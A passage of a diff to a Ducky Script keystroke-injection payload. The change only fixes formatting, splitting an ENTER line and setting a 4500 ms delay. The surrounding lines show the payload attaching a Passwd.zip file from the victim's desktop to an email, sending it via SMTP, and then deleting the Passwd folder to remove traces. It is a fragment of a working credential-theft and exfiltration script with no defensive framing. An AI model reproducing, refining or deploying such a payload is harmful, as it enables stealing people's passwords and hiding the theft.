@@ -40,8 +40,9 @@ STRING $attachment="C:\Users\$env:UserName\Desktop\Passwd.zip"
 ENTER
 STRING $ReportEmail.Attachments.Add($attachment)
 ENTER
-STRING $SMTPInfo.Send($ReportEmail)ENTER
-DELAY
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 4500
 STRING del "C:\Users\$env:UserName\Desktop\Passwd"
 ENTER
 A
